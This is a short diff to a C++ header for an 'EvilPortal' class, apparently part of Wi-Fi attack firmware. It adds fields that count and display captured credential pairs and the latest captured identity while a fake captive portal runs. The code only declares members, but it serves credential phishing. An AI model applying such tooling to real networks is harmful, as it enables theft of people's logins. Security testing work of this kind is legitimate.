@@ -110,6 +110,16 @@ class EvilPortal {
     bool begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void main(uint8_t scan_mode);
     void setHtmlFromSerial();
+
+    // Live status HUD (shown while the portal is up).
+    uint32_t num_creds = 0;        // captured credential pairs this session
+    String   last_cred = "";       // most recent captured identity, for display
+    uint32_t portal_start_ms = 0;  // millis() when the portal came up (elapsed)
+    uint32_t portal_ui_ms = 0;     // HUD redraw timer
+    bool     portal_needs_clear = false;  // full-wipe the body on the first frame
+    #ifdef HAS_SCREEN
+      void drawPortalStatus();
+    #endif
     // Called from the esp_http_server "/get" handler (httpd task context) to
     // record a captured credential field; main() prints/logs it on the next
     // pass once both fields have arrived.
